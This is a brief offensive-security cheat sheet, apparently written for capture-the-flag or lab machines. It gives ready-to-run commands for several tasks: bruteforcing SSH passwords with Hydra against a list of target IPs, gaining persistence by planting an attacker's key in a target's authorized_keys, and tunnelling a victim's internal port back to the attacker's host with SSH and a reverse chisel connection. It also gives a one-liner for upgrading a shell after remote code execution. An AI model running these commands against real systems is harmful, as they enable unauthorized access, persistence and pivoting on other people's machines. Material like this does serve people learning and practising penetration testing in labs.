# Tips
## Bruteforce SSH
Use Hydra :
```bash
hydra -l 'USERNAME' -P FILE_CONTAINING_PASSWORDS -M FILE_CONTAINING_IP_TO_BRUTEFORCE -t 4 ssh
```
## Persistance
Generate SSH key :
```bash
ssh-keygen -t rsa
```
Paste it to authorized_keys :
```bash
echo XXXX >> ~/.ssh/authorized_keys
```
Then, put the file on the target machine.
## Port Forwarding
### Using SSH
To access a locally exposed service on a remote machine :
```bash
ssh -L YOUR_PORT:localhost:PORT_EXPOSED USERNAME@IP_ADDRESS
```
### Using chisel
To redirect a port (here, 3000) when you're in a docker for example (victim = 172.17.0.1 and your host = 10.10.16.8). Firstly, run a chisel server on your host :
```bash
./chisel server -p 8000 --reverse
```
Then, on the docker, redirect to your host from the victim machine :
```bash
./chisel client 10.10.16.8:8000 R:127.0.0.1:8890:172.17.0.1:3000
```
Then you can access the service with http://localhost:8890/.
## Get a proper shell on RCE
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
